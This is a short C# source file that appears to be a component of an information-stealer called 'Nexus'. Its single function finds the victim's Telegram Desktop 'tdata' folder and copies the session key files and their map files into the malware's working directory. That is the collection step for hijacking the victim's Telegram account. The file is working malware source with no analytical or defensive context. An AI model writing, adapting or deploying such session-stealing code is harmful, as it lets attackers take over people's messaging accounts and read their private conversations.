using System;

using System.IO;

using System.Collections.Generic;

using System.Text;

namespace Nexus.core
{
    internal sealed class cTelegram
    {

        public static bool GetTelegram()
        {
            try
            {
                string sDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata";

                if (!Directory.Exists(sDir))
                    return false;

                foreach (string sFile in Directory.GetFiles(sDir))
                    if (sFile.Contains("D877"))
                        File.Copy(sFile, cConfig.workdir + "\\" + Path.GetFileName(sFile));

                foreach (string stDir in Directory.GetDirectories(sDir))
                    if (stDir.Contains("D877"))
                    {
                        string sOutoutDir = cConfig.workdir + "\\" + stDir.Split('\\')[stDir.Split('\\').Length - 1];
                        Directory.CreateDirectory(sOutoutDir);

                        foreach (string sFile in Directory.GetFiles(stDir))
                            if (sFile.Contains("map"))
                                File.Copy(sFile, sOutoutDir + "\\" + Path.GetFileName(sFile));
                    }
                return true;
            }

            catch { return false; }
        }
    }
}